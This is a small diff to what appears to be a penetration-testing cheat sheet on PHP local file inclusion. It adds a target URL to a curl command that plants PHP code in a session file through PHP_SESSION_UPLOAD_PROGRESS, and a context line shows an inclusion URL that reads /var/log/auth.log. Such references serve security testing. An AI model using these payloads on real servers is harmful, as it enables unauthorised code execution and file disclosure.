@@ -113,7 +113,7 @@ http://example.com/index.php?page=/var/log/auth.log
 # PHP session.upload_progress 
 
 ```
-curl --cookie "PHPSESSID=attacker" -F "PHP_SESSION_UPLOAD_PROGRESS=<?php phpinfo(); ?>" -F "file=@test.png"
+curl --cookie "PHPSESSID=attacker" -F "PHP_SESSION_UPLOAD_PROGRESS=<?php phpinfo(); ?>" -F "file=@test.png" http://example.com/
 #then view session path like /var/lib/php/sess_attacker
 ```
 
